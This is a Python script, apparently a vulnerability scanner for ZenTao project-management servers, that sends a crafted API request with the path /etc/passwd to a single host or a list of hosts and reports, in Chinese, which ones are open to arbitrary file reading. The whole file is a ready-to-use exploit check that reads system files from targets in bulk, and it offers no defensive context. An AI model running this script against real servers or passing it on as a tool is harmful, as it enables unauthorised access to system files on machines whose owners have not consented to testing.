import requests
import argparse

def get_data_from_host(host):
    url = f"{host}/zentao/api-getModel-api-getMethod-filePath=/etc/passwd/"
    proxy = {"http": "127.0.0.1:8088", "https": "127.0.0.1:8088"}
    try:
        response = requests.get(url, timeout=10, proxies=proxy)
        if response.status_code == 200:
            data = response.json()  # Assuming the response is in JSON format
            if 'status' in data:
                print(f"{host}: 存在禅道任意文件读取漏洞")
        else:
            return f"Error: Received status code {response.status_code} from {host}"
    except requests.Timeout:
        return f"Request timed out for {host}"
    except requests.RequestException as e:
        return f"Request failed for {host}: {e}"
    except ValueError:
        return f"Error: Failed to parse JSON response from {host}"

def process_hosts(hosts):
    results = {}
    for host in hosts:
        results[host] = get_data_from_host(host)
    return results

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Fetch data from host(s)")
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument('-u', '--url', help="Single host URL")
    group.add_argument('-l', '--list', help="File containing list of hosts")
    
    args = parser.parse_args()
    
    if args.url:
        result = get_data_from_host(args.url)
        print(f"{args.url}:\n{result}")
    elif args.list:
        try:
            with open(args.list, 'r') as file:
                hosts = [line.strip() for line in file if line.strip()]
            results = process_hosts(hosts)
            for host, result in results.items():
                print(f"{host}:\n{result}")
        except FileNotFoundError:
            print(f"File not found: {args.list}")
        except Exception as e:
            print(f"An error occurred: {e}")
